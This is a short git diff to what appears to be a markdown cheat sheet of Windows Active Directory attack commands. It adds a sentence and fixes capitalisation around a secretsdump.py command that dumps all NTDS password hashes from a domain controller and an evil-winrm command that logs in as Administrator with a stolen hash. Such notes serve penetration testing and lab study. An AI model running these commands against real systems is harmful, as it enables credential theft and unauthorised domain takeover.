@@ -26,10 +26,11 @@ secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/n
 ```
 **Another way to do that** 
 
+This command will dump all NTDS hashes: 
 ```
 secretsdump.py -just-dc <username>:<password>@[Target_IP]
 ```
-now we could use ```evil-winrm``` to open session using the NTML hashes we got:
+Now we could use ```evil-winrm``` to open session using the NTML hashes we got:
 ```
 evil-winrm -i <target ip> -u Administrator -H <hash of administrator>
 ```
